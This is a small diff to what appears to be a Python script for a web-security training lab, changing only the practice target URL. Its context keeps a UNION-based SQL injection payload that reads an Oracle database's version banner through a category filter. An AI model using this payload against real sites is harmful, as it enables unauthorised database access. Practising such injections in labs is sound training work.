@@ -4,7 +4,7 @@
 import requests
 
 # 2 columns - strings
-url = "https://ac9a1fcc1e9054118025ee640014008d.web-security-academy.net/filter?category=Pets"
+url = "https://ac201f211f9ad02a80340f28005f0016.web-security-academy.net/filter?category=Pets"
 payload = "' UNION SELECT NULL, Banner FROM v$version--"
 
 try:
